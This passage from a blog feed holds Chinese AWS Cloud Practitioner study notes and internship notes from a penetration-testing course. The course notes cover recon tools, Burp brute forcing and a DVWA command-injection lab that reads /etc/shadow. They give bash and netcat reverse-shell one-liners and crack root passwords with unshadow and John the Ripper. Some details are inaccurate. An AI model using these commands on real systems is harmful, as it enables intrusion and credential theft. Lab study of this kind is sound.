<ul><li>以近即時方式列出指標</li></ul></li><li>CloudWatch的優點:<ul><li>從一個集中位置存取所有指標，獲得全系統的可見性</li><li>檢視應用、基礎設施及服務</li><li>減少<strong>MTTR(解決問題的平均時間)<strong>，</strong>並改善總整體成本(TCO)</strong></li><li>深入分析應用，並幫助最佳化客戶應用</li></ul></li></ul><h3 id="AWS-Trusted-Advisor"><a href="#AWS-Trusted-Advisor" class="headerlink" title="AWS Trusted Advisor"></a>AWS Trusted Advisor</h3><ul><li>為一自動化顧問</li><li>他會根據<strong>五大支柱</strong>來評估資源<ul><li>成本最佳化</li><li>效能</li><li>安全</li><li>容錯能力</li><li>Service Limits</li></ul></li><li>會對每個支柱進行一系列檢查，並編譯分類項目供檢視</li><li>有些檢查免費</li><li>檢查項目例如: 是否啟用MFA</li></ul><h2 id="網路連結與內容交付"><a href="#網路連結與內容交付" class="headerlink" title="網路連結與內容交付"></a>網路連結與內容交付</h2><h3 id="AWS-Elastic-Load-Balancing"><a href="#AWS-Elastic-Load-Balancing" class="headerlink" title="AWS Elastic Load Balancing"></a>AWS Elastic Load Balancing</h3><ul><li>一種可在多個資源 (例如 Amazon EC2 執行個體) 之間自動分配傳入應用程式流量的 AWS 服務</li></ul><p><img src="https://i.imgur.com/sJyERPV.png"></p><ul><li>ELB會作為傳入 Auto Scaling 群組之所有 Web 流量的單一聯絡窗口。也就是說，當您為了回應傳入流量而新增或移除 Amazon EC2 執行個體時，這些請求會先路由到負載平衡器，然後分散到即將處理這些請求的多個資源中。</li></ul><h2 id="安全性、識別與合規性"><a href="#安全性、識別與合規性" class="headerlink" title="安全性、識別與合規性"></a>安全性、識別與合規性</h2><p>共同責任模型(Shared Responsibility Model)<br><img src="https://i.imgur.com/wMSpH1U.png"><br><img src="https://i.imgur.com/HOmBArE.png"></p><ul><li>客戶記得自己patch OS</li><li>aws與客戶的關係如同房屋屋主以及建商</li></ul><h3 id="AWS-Artifact"><a href="#AWS-Artifact" class="headerlink" title="AWS Artifact"></a>AWS Artifact</h3><ul><li>可以存取合規性報告，報告本身由第三方所檢驗</li><li>AWS Artifact 協議<ul><li>公司需要與 AWS 簽署關於您在整個 AWS 服務中使用特定類型資訊的協定</li><li>可以檢閱、接受和管理個別帳戶以及 AWS Organizations 中所有帳戶的協議。其中會提供不同類型的協議</li></ul></li><li>AWS Artifact 報告<ul><li>可以檢閱、接受和管理個別帳戶以及 AWS Organizations 中所有帳戶的協議。其中會提供不同類型的協議，可在 AWS Artifact 報告中存取此資訊</li><li>在 AWS Artifact 報告中存取此資訊</li></ul></li></ul><h3 id="Amazon-GuardDuty"><a href="#Amazon-GuardDuty" class="headerlink" title="Amazon GuardDuty"></a>Amazon GuardDuty</h3><ul><li>AWS威脅偵測服務</li><li>會分析帳戶產生的中繼資料連續串流，像是來自CloudTrail、VPC Flow Logs、DNS log</li><li>與aws現有服務分開執行，不會影響現有基礎設設施效能</li></ul><h3 id="AWS-Identity-and-Access-Management-IAM"><a href="#AWS-Identity-and-Access-Management-IAM" class="headerlink" title="AWS Identity and Access Management (IAM)"></a>AWS Identity and Access Management (IAM)</h3><ul><li>透過IAM可以精細的控制權限</li><li>在IAM中可以建立IAM User</li><li>IAM在剛建立時，預設不具備任何許可(不可建立EC2, S3…etc)</li><li>最低權限原則</li><li>IAM政策<ul><li>是JSON文件，描述使用者可以執行或不可執行那些API操作</li><li>可以將政策連接到使用者或是群組</li><li>Effect: <code>Allow</code> <code>Deny</code></li><li>Action: 可對資源最哪些行為</li><li>Resource: API呼叫適用於哪種AWS資源</li></ul></li><li>IAM 群組 </li><li><img src="https://i.imgur.com/u29juKI.png"></li><li>角色(Role)<ul><li>不同工作時，角色會進行切換</li><li>在AWS中也能夠建立角色</li><li>角色具有相關聯的許可，可以允許或拒絕特定動作</li><li>使用者可以暫時擔任某個角色，但沒有使用者名稱或密碼</li><li>僅能獲得暫時的許可權</li></ul></li><li><img src="https://i.imgur.com/Ds4cHxv.png"></li></ul><h3 id="Amazon-Inspector"><a href="#Amazon-Inspector" class="headerlink" title="Amazon Inspector"></a>Amazon Inspector</h3><ul><li>針對基礎設施執行自動化安全評估，以提高安全性和aws部署應用程式的合規性</li><li>可用於察看與Best Practice之間的偏差</li><li>漏洞檢查</li><li>服務分成三種:<ul><li>網路組態可達性部分</li><li>Amazon 代理程式</li><li>安全性評定服務</li></ul></li></ul><h3 id="AWS-Shield"><a href="#AWS-Shield" class="headerlink" title="AWS Shield"></a>AWS Shield</h3><ul><li>是一項可保護應用程式免於遭受 DDoS 攻擊的服務</li><li>AWS Shideld Syandard<ul><li>可免費自動保護所有 AWS 客戶</li><li>使用分析技術即時偵測並自動延緩惡意流量</li></ul></li><li>AWS Shield Advanced<ul><li>可提供詳細的攻擊診斷，和偵測與減輕複雜的 DDoS 攻擊。</li></ul></li></ul><h3 id="AWS-WAF"><a href="#AWS-WAF" class="headerlink" title="AWS WAF"></a>AWS WAF</h3><ul><li>使用Web應用程式防火牆(WAF)來篩選傳入流量</li><li>機器學系幫助識別新威脅</li><li>主動防禦</li><li>可以設定Web ACL</li></ul><h3 id="AWS-Organizations"><a href="#AWS-Organizations" class="headerlink" title="AWS Organizations"></a>AWS Organizations</h3><ul><li>管理多個aws帳戶中的中央位置</li><li>管理帳單、控制存取、合規與安全</li><li>讓所有aws帳號共享資源</li><li>功能:<ul><li>集中式管理aws帳戶</li><li>所有帳戶可合併帳單(具有折扣)</li><li>實作帳戶的階層分組(ex. BU(業務單位)、OU(組織單位))</li><li>控制每個帳戶可以存取的AWS服務以及可執行的API動作<ul><li>服務控制政策(SCP)，可用於指定成員帳戶的最大許可</li></ul></li></ul></li><li><img src="https://i.imgur.com/qwvjWXE.png"></li></ul><h3 id="Amazon-Elastic-Block-Store-Amazon-EBS"><a href="#Amazon-Elastic-Block-Store-Amazon-EBS" class="headerlink" title="Amazon Elastic Block Store (Amazon EBS)"></a>Amazon Elastic Block Store (Amazon EBS)</h3><ul><li>不希望每次使用完EC2執行個體後，資料庫就被刪掉，則可使用EBS服務</li><li>可建立虛擬硬碟，EBS磁碟區，並連接到EC2執行個體上</li><li>EBS並不直接與EC2綁定，因此可以獨立於EC2的生命週期，來持久化存放資料</li><li>需定義：大小、類型、組態</li><li>用例: 持久化儲存讓EC2寫入資料，因此備份資料很重要</li><li>EBS允許增量備份資料(又稱作<strong>快照</strong>)</li><li>定期為EBS進行快照，以備份重要資料</li><li><strong>執行個體存放區</strong>: 為EC2中所提供的臨時區塊是存放區，當EC2終止時，存放區中的資料也會消失</li><li><img src="https://i.imgur.com/8AVNGzr.png"></li><li><img src="https://i.imgur.com/1kkfeOT.png"></li><li><img src="https://i.imgur.com/QNVkgdB.png"></li><li>EBS 快照: 第一次備份會複製磁碟區中所有資料，後續就只會儲最近一次快照以來變更的資料區塊，屬於<strong>增量備份</strong></li></ul><h3 id="Amazon-S3"><a href="#Amazon-S3" class="headerlink" title="Amazon S3"></a>Amazon S3</h3><ul><li>資料存放以<strong>物件</strong>形式存放，但並非存放於檔案目錄，而是存放在<strong>儲存眝體(bucket)</strong></li><li>上傳物件大小上限為： <strong>5TB</strong></li><li>可以建立**物件版本(Object Versioning)**，防止意外刪除</li><li>可以建立多個buckt，來放在不同資料類別或是資料層中</li><li>可建立許可(Permission)來限制誰可以存取物件</li><li><code>Amazon S3 Standard</code>: 具有 99.99999999% 耐久性，代表該檔案在一年後保持完整的機率<ul><li><code>資料存放的方式</code>: 資料至少會存放在三個設施中，在不同地點都有副本</li><li><code>靜態網站託管</code>: 託管html檔或其他靜態檔案資產到s3</li></ul></li><li><code>Amazon S3 Standard-Infrequent(IA)</code>: 用於存取頻率低，但需要時需要快速存取<ul><li>適合存放備份、災害復原、長期存放資料</li><li><code>Amazon S3 Glacier</code>: 可用於稽核資料長期存放</li><li>可建立文件庫，並使用<strong>文件庫鎖定政策</strong>，來滿足當地法規對於稽核資料存放年限的要求</li><li>可在文件庫鎖定政策中使用控制措施 - <strong>單寫多讀(WORM)</strong> 模型，來防止未來的寫入行為</li></ul></li><li>生命週期政策: 可在不同層之間自動移動資料<ul><li>例如: 需要將一個物件在S3 Standard中保留90天，接下來移動到s3-IA中保留30天，120天候移動到s3 glacier，這種時候就能夠建立生命週期政策來自動化這些行為</li></ul></li><li><code>Amazon S3 單區域-IA</code> <ul><li>資料存放在單一區域中</li><li>價格比S3 Standard-IA還要低</li><li>若想要節省儲存成本則選擇此儲存類別</li></ul></li><li><code>Amazon S3 Intelligent-Tiering</code><ul><li>適合存取模式未知或持續變更的資料</li><li>每個物件需要支付小額每月監控和自動化費用</li></ul></li><li>物件:</li><li><img src="https://i.imgur.com/fNAXd5H.png"></li></ul><h3 id="Amazon-S3-Glacier"><a href="#Amazon-S3-Glacier" class="headerlink" title="Amazon S3 Glacier"></a>Amazon S3 Glacier</h3><ul><li>專會資料封存所設計</li><li>能在幾分鐘或幾小時內擷取資料</li><li>可用於儲存已封存的客戶資料或是舊相片影片檔案</li></ul><h3 id="Amazon-S3-Glacier-Deep-Archive"><a href="#Amazon-S3-Glacier-Deep-Archive" class="headerlink" title="Amazon S3 Glacier Deep Archive"></a>Amazon S3 Glacier Deep Archive</h3><ul><li>適合封存的最低成本物件儲存類別</li><li>能在12小時內擷取物件</li></ul><h3 id="Amazon-Elastic-File-System-Amazon-EFS"><a href="#Amazon-Elastic-File-System-Amazon-EFS" class="headerlink" title="Amazon Elastic File System (Amazon EFS)"></a>Amazon Elastic File System (Amazon EFS)</h3><ul><li>允許多個執行個體同時存去EFS當中的資料</li><li>可是需求擴展或縮減</li></ul><h2 id="EBS-與-S3的比較"><a href="#EBS-與-S3的比較" class="headerlink" title="EBS 與 S3的比較"></a>EBS 與 S3的比較</h2><table><thead><tr><th></th><th>EBS</th><th>S3</th></tr></thead><tbody><tr><td>儲存容量</td><td>16TB</td><td>無限制，個別物件最高為5TB</td></tr><tr><td>特色</td><td>在EC2終止時繼續存活</td><td>單寫多讀(WORM)</td></tr><tr><td>儲存型態</td><td>固態</td><td></td></tr><tr><td>耐久度</td><td></td><td>99.99999999%</td></tr><tr><td>使用案例</td><td>80GB影片檔案正在編輯，可啟用物件版本紀錄，而不用每次都重新上傳全新的物件，採用區塊式儲存</td><td>靜態網站託管、區域分散式儲存、資料備份、無伺服器</td></tr><tr><td>總結案例</td><td>複雜寫入讀取更動等功能</td><td>完整物件、偶而更動等資料</td></tr></tbody></table><h2 id="EBS-與-EFS的差別"><a href="#EBS-與-EFS的差別" class="headerlink" title="EBS 與 EFS的差別"></a>EBS 與 EFS的差別</h2><ul><li>EBS磁碟區會連接到EC2，而EBS是 <strong>可用區域層級資源</strong>，若要將EC2連接到EBS上，兩者必須位於相同可用區域當中</li><li>EBS是硬碟，可存放檔案資料、資料庫或應用程式，硬碟區塞滿後，並不會資動擴展</li><li>EFS並不是一個空白的硬碟，而是真正的Linux檔案系統</li><li>EFS是一種<strong>區域性資源</strong>，區域內的任何EC2都能夠寫入EFS檔案系統</li><li>EFS寫入更多資料時，它會自動擴展</li></ul><h2 id="RDS-和-DynamoDB的差別"><a href="#RDS-和-DynamoDB的差別" class="headerlink" title="RDS 和 DynamoDB的差別"></a>RDS 和 DynamoDB的差別</h2><table><thead><tr><th>RDS</th><th>DynamoDB</th></tr></thead><tbody><tr><td>自動高可用性、可提供復原</td><td>鍵值對，不須結構性描述</td></tr><tr><td>客戶擁有資料所有權</td><td>巨大傳輸容量</td></tr><tr><td>客戶擁有描述所有權(Schema)</td><td>PB級大小擴展潛力</td></tr><tr><td>客戶對網路有控制權</td><td>精密API存取權限</td></tr></tbody></table><p>使用案例:</p><ul><li>銷售供應鏈管理系統，若要進行商業分析，則需要複雜的關聯式連結，這時就適合使用RDS</li><li>上述案例外的其他案例，DynamoDB幾乎都可用，大多案例不需要複雜的關聯式連結，像是員工聯絡人表格，用單一表格就能夠解決了，RDS的複雜功能以及管理費用，DynamoDB則能夠消除所有管理費用，並且可建立快速高效能的資料庫</li></ul><h2 id="定價"><a href="#定價" class="headerlink" title="定價"></a>定價</h2><ul><li>免費方案:<ul><li>永遠免費<ul><li>AWS Lamda每個月允許一百萬次免費呼叫</li></ul></li><li>12個月免費<ul><li>S3 可免費使用12個月高達5GB的儲存</li></ul></li><li>某些服務可以短期試用<ul><li>Lightsaul 提供一個月的試用期，使用期間最高可達750小時</li></ul></li></ul></li><li>Pricing Model<ul><li>Pay-as-you-go 按照使用量付費，無須長期合約</li><li>預留容量</li><li>以量計算的折扣: 某些服務提供分級定價，每單位成本隨著用量增加而降低<ul><li>Ex. S3儲存空間越多，每GB支付費用就越少</li></ul></li></ul></li><li>定價計算機</li><li>帳單儀表板<ul><li>存取 Cost Explorer 並建立預算</li><li>將您本月份至今的餘額與上個月進行比較，並根據目前的用量獲得下個月的預測</li><li>檢視各項服務免費方案用量</li><li>發布 AWS 成本和用量報告</li></ul></li><li>合併帳單<ul><li>為AWS Organization的功能之一</li><li>可以將個別aws帳戶的帳單合併，ˇ但還是可以分項查看帳單</li><li>可以將AWS資源的使用量彙總到組織層級</li><li>個別帳戶帳單即使金額低，若合併組織中的帳單有機會獲得批量折扣價</li><li>簡化計費流程</li><li>免費功能</li><li>一個組織允許的預設帳戶數目上限為 4 個</li></ul></li><li>預算服務<ul><li>可以建立預算金額閥值，並發出警示提醒到電子郵件中 </li><li>預算中的資訊每天更新三次</li></ul></li><li>Cost Explorer<ul><li>以控制台為基礎的服務，可透過視覺化來查看跟分析在aws上的花費</li><li>會顯示在哪個服務上化最多錢</li><li>並提供12個月的歷史資料，可追蹤成本隨時間的變化</li><li>提供強大的報表，也可自定義報表內容</li></ul></li></ul><h2 id="Support-服務"><a href="#Support-服務" class="headerlink" title="Support 服務"></a>Support 服務</h2><ul><li>基本支援(免費)<ul><li>24小時客服服務</li><li>文件、白皮書、論壇</li><li>AWS Trusted Advisor</li><li>AWS Personal Health Dashboard</li></ul></li><li>開發人員方案<ul><li>基本支援</li><li>電子郵件取得客戶支援(12小時回覆)</li></ul></li><li>商業支援<ul><li>基本與開發人員支援</li><li>AWS Trusted Advisor提供完整最佳實踐檢查</li><li>直接與雲端支援工程師電話聯絡(4小時的回應SLA)</li><li>若生產系統受損，針對損壞的生產系統提供1小時的SLA</li><li>基礎設施事件管理(EX.大型活動、全球發布會…etc)</li></ul></li><li>企業支援(適合執行關鍵任務工作負載的公司)<ul><li>基本、開發人員和商業支援(外加針對商業關鍵工作負載的15分鐘SLA)</li><li>適用於TAM(Technical Account Manager)的技術帳戶管理員<ul><li>TAM會與客戶一同根據Well-Architected 架構來檢視企業架構</li></ul></li></ul></li></ul><p><img src="https://i.imgur.com/r20KK1m.png"></p><h2 id="AWS-Marketplace"><a href="#AWS-Marketplace" class="headerlink" title="AWS Marketplace"></a>AWS Marketplace</h2><ul><li>是包含獨立軟體開發廠商數千種軟體產品的數位型錄，可簡化、部署和管理在AWS架構中執行第三方軟體的步驟</li><li>您可以使用 AWS Marketplace 尋找、測試和購買能在 AWS 上執行的軟體</li><li>當客戶在使用Marketplace中的第三方應用時，無需建構安裝維護這些程式所需的基礎設施</li><li>一鍵式部署</li><li>一樣按使用量付費</li><li>許多廠商提供免費試用</li><li>以企業為主的功能<ul><li>可自訂條款和定價，可管理自訂授權合約</li><li>私人市集，可建立符合當地法規或安全要求的預先核准軟體決方案目錄</li><li>整合採購系統</li><li>aws成本管理工具</li></ul></li></ul><h2 id="AWS-Cloud-Adoption-Framework-AWS-CAF"><a href="#AWS-Cloud-Adoption-Framework-AWS-CAF" class="headerlink" title="AWS Cloud Adoption Framework(AWS CAF)"></a>AWS Cloud Adoption Framework(AWS CAF)</h2><ul><li>向客戶公司提供建議，藉由指引協助客戶管理遷移至雲端的過程</li><li>AWS CAF觀點(不同領域的人帶來不同觀點，並且會有不同的遷移策略)<ul><li>商業: 側重商業能力</li><li>人員: 側重商業能力</li><li>治理: 側重商業能力</li><li>平台: 技術能力</li><li>安全: 技術能力</li><li>營運: 技術能力</li></ul></li></ul><h2 id="遷移策略"><a href="#遷移策略" class="headerlink" title="遷移策略"></a>遷移策略</h2><ul><li>6個R策略<ul><li>重新託管(Rehosting)<ul><li>選取應用程式幾乎照搬到AWS</li><li>僅透過重新託管能夠節省高達30%的總成本</li></ul></li><li>平台重建&#x2F;微調搬遷<ul><li>會進行一些雲端最佳化，但不需要調整核心程式碼</li></ul></li><li>汰換(Retired)<ul><li>某些企業的it產品組合中包含不再使用的應用程式</li></ul></li><li>保留(Retain)<ul><li>某些應用程式需要被取代，但時機未到，可能還會再跑好幾個月</li><li>這些應用就可遷移到aws</li></ul></li><li>重新購買(Repurchase)<ul><li>放棄舊有授權軟體，轉用雲端原生產品等</li><li>前期成本高，但潛在益處大</li></ul></li><li>重構(Refactor)<ul><li>重寫程式碼</li><li>某些功能可能是以前無法再內部部署的</li></ul></li></ul></li></ul><h2 id="AWS-Snow-Family"><a href="#AWS-Snow-Family" class="headerlink" title="AWS Snow Family"></a>AWS Snow Family</h2><p>皆防竄改，皆由客戶的256bit金鑰來對資料進行加密<br><img src="https://i.imgur.com/2lh2GeS.png"></p><h3 id="AWS-Snowcone"><a href="#AWS-Snowcone" class="headerlink" title="AWS Snowcone"></a>AWS Snowcone</h3><ul><li>最多可容納8TB的資料並包含<strong>邊緣運算(包含EC2和AWS IOT Greengrass)</strong></li><li>可以透過aws主控台下單裝置</li><li>客戶可以安裝裝置並複製資料再運回aws</li><li>aws再將資料複製到aws帳戶中的s3 bucket</li><li>8TB,4G RAM, 2CPU</li></ul><h3 id="AWS-Snowball-Edge"><a href="#AWS-Snowball-Edge" class="headerlink" title="AWS Snowball Edge"></a>AWS Snowball Edge</h3><ul><li>兩種選項<ul><li>Compute Optimized:<ul><li>適合大規模資料遷移以及週期性傳輸工程</li><li>80TB</li></ul></li><li>Storage Optimized: <ul><li>適合機器學習、全動態影片分析以及本機運算堆疊</li><li>80TB</li></ul></li></ul></li><li>可以放入現有伺服器機架</li><li>並可使用ec2或iot Greengras做運算</li><li>使用案例<ul><li>Iot裝置串流</li><li>影片轉碼</li><li>工業訊號處理</li></ul></li></ul><h3 id="AWS-Snowmobile"><a href="#AWS-Snowmobile" class="headerlink" title="AWS Snowmobile"></a>AWS Snowmobile</h3><ul><li>裝置在45英尺高的巨大容器中</li><li>由卡車運送</li><li>容納100PB(100000TB)的資料</li><li>裝置防竄改、防水、滅火，具有溫度控制功能</li><li>安全團隊視訊監控護宋團隊</li></ul><h2 id="可用區域-Avaiable-Zone"><a href="#可用區域-Avaiable-Zone" class="headerlink" title="可用區域(Avaiable Zone)"></a>可用區域(Avaiable Zone)</h2><p><img src="https://i.imgur.com/l3j0kFf.png"><br>AZ是區域內的一個資料中心或一組資料中心。可用區域各自坐落於彼此的數十英里外。這個距離夠近，足以在可用區域之間維持低延遲 (內容從請求到接收之間的時間)。不過，如果區域中的一部分發生災難，它們的距離也夠遠，足以降低多個可用區域受到影響的機會。</p><h2 id="節點"><a href="#節點" class="headerlink" title="節點"></a>節點</h2><p>是透過 CloudFront 來將您內容的快取副本存放在更靠近客戶位置的站點，以便加快交付<br><img src="https://i.imgur.com/LEbdL9B.png"></p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Certificate </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>實習筆記-滲透測試課程</title>
      <link href="/posts/8ec27a58.html"/>
      <url>/posts/8ec27a58.html</url>
      
        <content type="html"><![CDATA[<p>課程內容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- Web基本知識</span><br><span class="line">- 主動/被動資訊收集</span><br><span class="line">- 常見的web漏洞</span><br><span class="line">- 靶機</span><br><span class="line">- DVWA（Damn Vulnerable Web Application）</span><br><span class="line">- RF(無線射頻)滲透測試(物聯網)</span><br><span class="line">- 基本的通訊協定</span><br><span class="line">- 軟體定義無線電SDR</span><br></pre></td></tr></table></figure><h2 id="PT-滲透測試-vs-RT-紅隊演練"><a href="#PT-滲透測試-vs-RT-紅隊演練" class="headerlink" title="PT(滲透測試) vs RT(紅隊演練)"></a>PT(滲透測試) vs RT(紅隊演練)</h2><ul><li>PT:範圍較小，且無法針對社交工程 ex.某個網頁</li><li>RT:範圍較大 ex.整個公司</li></ul><p>黑箱:最貼近真實情境<br>白箱:盡可能提供相關資訊給受測者<br>灰箱:黑白箱混和，會提供自我宣告表以後再給受測者測試</p><h2 id="滲透測試流程"><a href="#滲透測試流程" class="headerlink" title="滲透測試流程:"></a>滲透測試流程:</h2><ol><li>資料蒐集</li><li>透洞掃描</li><li>漏洞利用<br> 白帽:<ol start="4"><li>漏洞回報<br> 黑帽:</li><li>提權限</li><li>持續性存取</li><li>防禦逃脫(逃脫會叫的那種警報器)</li><li>資料攜出(把DB分批攜出)<br><img src="https://i.imgur.com/10o9kG8.jpg"></li></ol></li></ol><h2 id="IOT的攻擊向量-Attack-Vector"><a href="#IOT的攻擊向量-Attack-Vector" class="headerlink" title="IOT的攻擊向量(Attack Vector)"></a>IOT的攻擊向量(Attack Vector)</h2><p><img src="https://i.imgur.com/CFMACnJ.jpg"></p><ul><li>Hardware:Physical Interface<br>  給開發人員使用，出廠後並未關掉，若能訪問到該接口通常都能直接取得root，通常底層皆為明文傳輸<ul><li>設備外殼並未提供保護機制</li><li>底層使用明文傳輸</li><li>毛刺攻擊(Glitching):用微小的電壓，去擾動硬體設備</li><li>測信到攻擊(Side Channel Attack):加密晶片，可以去量測他的電壓、音頻…，用這些東西去分析加密的方式、Key等等</li></ul></li><li>韌體(Firmware):Hardcode, Enc key, exploit<ul><li>軟體&#x2F;韌體未進行加密</li><li>有敏感資料</li></ul></li><li>Software:Andriod app</li><li>Radio:Cellular, WiFi, 蜂窩網路<ul><li>無線通訊未加密可進行嗅探(Sniffer)</li><li>干擾攻擊(Jamming)</li><li>重放攻擊</li><li>模糊攻擊(fuzz):需先擬向工程才能fuzz</li><li>通訊協定:最麻煩，需要原廠處理</li></ul></li><li>Cloud:<ul><li>API攻擊</li><li>注入攻擊</li><li>身分認證&#x2F;授權機制</li><li>邏輯漏洞</li><li>web漏洞</li></ul></li></ul><h2 id="網頁的攻擊向量"><a href="#網頁的攻擊向量" class="headerlink" title="網頁的攻擊向量"></a>網頁的攻擊向量</h2><p><img src="https://i.imgur.com/zfkdfrI.jpg"><br>Web1.0</p><ul><li>布告欄的概念</li><li>只有靜態網頁</li></ul><p>Web2.0</p><ul><li>可讀寫，多功能的動態頁面</li><li>應用程序</li><li>DB(個資)</li><li>API</li><li>不同用戶會有不同的頁面</li></ul><p>Web3.0</p><ul><li>去中心化(資料分散放)</li></ul><p>HTTP</p><ul><li>由Request&#x2F;Response組成</li><li>由於HTTP屬於無狀態，因此需依賴cookie機制來記錄user資訊與time</li><li>狀態碼<br>  <img src="https://i.imgur.com/Bk1hb59.png"></li></ul><h2 id="攻擊標的"><a href="#攻擊標的" class="headerlink" title="攻擊標的"></a>攻擊標的</h2><ol><li>使用者身分</li></ol><ul><li>認證</li><li>權限劃分</li><li>Session<br>ex.HTTP封包格式皆相同，該基站</li></ul><ol start="2"><li>輸入輸出:</li></ol><ul><li>Sql Injection</li><li>Command Injection</li><li>需經過正規化處理</li><li>開發者需要設定確定的字元<br>ex. 數字欄位填中文或英文</li></ul><ol start="3"><li>程式邏輯</li></ol><h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具:"></a>常用工具:</h2><p>Information Gathering:分為主動、被動</p><ul><li><p>主動資訊蒐集<br>  <img src="https://i.imgur.com/M9nPHnv.png"></p><ul><li>nmap主動蒐集目標資訊:掃描目標主機port<br>  <img src="https://i.imgur.com/GTvO6kr.jpg"></li><li>Nikto開源的網站弱點掃描工具:自帶在Kali內</li><li>Dirb暴力枚舉網頁下的目錄與檔案  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dirb url</span><br><span class="line">#去看網頁內存不存在敏感資料</span><br><span class="line">#有可能可以掃出使用者的路徑</span><br><span class="line">#如果有開阿帕契作為中繼站，能掃出來</span><br></pre></td></tr></table></figure></li></ul></li><li><p>被動資訊蒐集</p><ul><li><p>用被動資料(IP、姓名、生日..)來描述目標</p></li><li><p>不與目標直接接觸，避免留下痕跡</p></li><li><p>SHODAN</p><ul><li>可以掃描世界上所有的物聯網設備</li><li>主機</li><li>開啟端口</li><li>是否有已知漏洞</li><li>可使用下方關鍵字搜尋:<ul><li>hostname：搜尋指定的主機或域名，例如 hostname:”google”</li><li>port：搜尋指定的埠或服務，例如 port:”21”</li><li>country：搜尋指定的國家，例如 country:”CN”</li><li>city：搜尋指定的城市，例如 city:”Hefei”</li><li>org：搜尋指定的組織或公司，例如 org:”google”</li><li>isp：搜尋指定的ISP供應商，例如 isp:”China Telecom”</li><li>product：搜尋指定的作業系統&#x2F;軟體&#x2F;平臺，例如 product:”Apache httpd”</li><li>version：搜尋指定的軟體版本，例如 version:”1.6.2”</li><li>geo：搜尋指定的地理位置，引數為經緯度，例如 geo:”31.8639, 117.2808”</li><li>before&#x2F;after：搜尋指定收錄時間前後的資料，格式為dd-mm-yy，例如 before:”11-11-15”</li><li>net：搜尋指定的IP地址或子網，例如net:”210.45.240.0&#x2F;24”</li><li>參考:<ul><li><a href="https://www.tp1rc.edu.tw/tpnet2020/training/1090303.pdf">https://www.tp1rc.edu.tw/tpnet2020/training/1090303.pdf</a></li><li><a href="https://www.itread01.com/content/1546699324.html">https://www.itread01.com/content/1546699324.html</a></li></ul></li></ul></li></ul></li><li><p>Google Hacking</p><ul><li>用Google Search針對目標進行情報搜尋</li><li>用”site:”去搜尋</li></ul></li></ul></li><li><p>過濾封包</p><ul><li>Burp Suite<br>  使用方法:<br>  使用Kali 開啟Burp Site<br>  <img src="https://i.imgur.com/8gomHwp.png"><br>  開啟proxy 表示之後所有流量都會經過burp<br>  &lt;之前的版本需要簽憑證&gt;<br>  使用Proxy開啟browser<br>  <img src="https://i.imgur.com/dWxhFur.png"><br>  進到project option&gt;MIST&gt;勾選Enable<br>  <img src="https://i.imgur.com/vswHeoq.png"><br>  就可以繼續使用proxy<br>  <img src="https://i.imgur.com/HwXBX1w.png"><br>  將IPor網址執行於瀏覽器中，封包就會被攔截進brower<br>  <img src="https://i.imgur.com/OATh3RT.png"><br>  <br><br></li></ul></li><li><p>暴力破解<br>  <img src="https://i.imgur.com/YuudCcZ.png"><br>  <img src="https://i.imgur.com/kf2mOL5.png"><br>  不同的Attack type有不同模式<br>  sniper:針對字典中設定的值交替順序測試<br>  <img src="https://i.imgur.com/An2qwjw.png"><br>  將存取內容傳到Repeater確認回應結果<br>  <img src="https://i.imgur.com/Tgird85.png"></p><p>  <img src="https://i.imgur.com/nwWHDyM.png"></p></li></ul><br><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>因為沒有針對用戶輸入進行過濾，因此會造成機敏資料外洩、等問題<br>Linux command</p><table><thead><tr><th>Column 1</th><th>Column 2</th></tr></thead><tbody><tr><td>; or &amp;</td><td>不管第一次執行的指令是否成功皆會執行第二個</td></tr><tr><td>&amp;&amp;</td><td>第一個指令失敗不會執行下一個</td></tr><tr><td>I(槓槓符號)</td><td>會把前一個指令的輸出當作下一個指令的輸入</td></tr><tr><td>II(槓槓符號)</td><td>會把前一個指令的輸出當作下一個指令的輸入</td></tr></tbody></table><hr><h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><p>1.Enter IP to get shell</p><p><img src="https://i.imgur.com/GZG7eOA.png"><br>可使用command加入一些linux指令<br><img src="https://i.imgur.com/FI8yUNJ.png"></p><p><img src="https://i.imgur.com/33iCHlV.png"><br>cat去撈 &#x2F;etc&#x2F;shadow<br><img src="https://i.imgur.com/zthZGDt.png"><br>ls -al 查看檔案權限<br><img src="https://i.imgur.com/Fl5HR9S.png"></p><p>ls -al | grep shadow<br>linux<br>&#x2F;etc&#x2F;passwd linux以前會把所有帳密放在裡面<br>&#x2F;etc&#x2F;shadow 現在linux會將它分開</p><h4 id="Reverse-shell"><a href="#Reverse-shell" class="headerlink" title="Reverse shell"></a><em>Reverse shell</em></h4><p>受害者的機器自行連回攻擊者的機器(出來比進去簡單)</p><p><strong>Bash</strong></p><ul><li>Victim: bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</li><li>Attacker:nc -nvlp port</li></ul><p><strong>Netcat</strong></p><ul><li>Victim:nc ip port -e &#x2F;bin&#x2F;bash</li><li>Attacker:nc -nvlp port</li></ul><p><img src="https://i.imgur.com/WHPfdBH.png"></p><p><strong>john the ripper</strong>暴力破解<br>可以參考Linux 的 &#x2F;etc&#x2F;shadow 檔案結構<br><a href="https://blog.gtwang.org/linux/linux-etc-shadow-file-format/">https://blog.gtwang.org/linux/linux-etc-shadow-file-format/</a></p><p>xdg-open &gt;&gt; 呈現file讓你可以直接開啟文件</p><br><p><strong>破解liunx root密碼</strong><br>將passwd和shadow合併 寫入crack中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshadow passwd shadow &gt; crack</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/vRRh7bK.png"><br>使用john來破解密碼<br><img 